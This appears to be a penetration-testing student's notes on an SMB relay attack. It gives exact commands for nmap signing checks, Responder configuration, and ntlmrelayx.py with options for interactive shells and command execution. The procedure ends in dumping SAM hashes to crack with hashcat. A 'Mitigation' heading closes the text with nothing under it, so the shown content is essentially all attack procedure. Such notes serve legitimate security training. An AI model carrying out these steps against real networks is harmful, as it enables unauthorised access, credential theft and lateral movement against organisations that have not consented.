Instead of capturing a hash, we reuse that hash in order to gain access.  If you're catching hashes but aren't able to crack it.
	SMB Signing must be disabled or not enforced on the target.  This is default on workstations, not default on servers.
	Relayed user credentials must be admin on machine for any real value.

See if SMB is even on and what it's settings are.
	`sudo nmap --script=smb2-security-mode.nse -p445 10.0.0.10 -Pn`
	Port 445 is SMB
	IP is target IP
	This may also show when running a -A on initial scans
	"Message signing enabled but not required" is the message you're looking for
		You can also run scripts against a network range
Create your targets.txt file with the IP's that you gathered that return "enabled but not required"
	`mousepad targets.txt`
Change Responder settings to turn SMB and HTTP off
	`sudo mousepad /etc/responder/Responder.conf`
Run Responder
	`sudo responder -I eth0 -dPv` - Again, the Interface depends on what interface you're using, tun0 for VPN connections
Run ntlmrelayx.py
	`ntlmrelayx.py -tf targets.txt -smb2support`
		-tf   is for 'target file'
		targets.txt is the list of targets that have been determined to be vulnerable
			-i   is optional but will attempt to get you a prompt (interactive)
				This will get you a port to bind to with `nc 127.0.0.1 <port>`
			-c   is optional but will run a command upon connection `-c "whoami"`
This should kick out the SAM, copy those hashes and go have some fun with hashcat

Mitigation for this
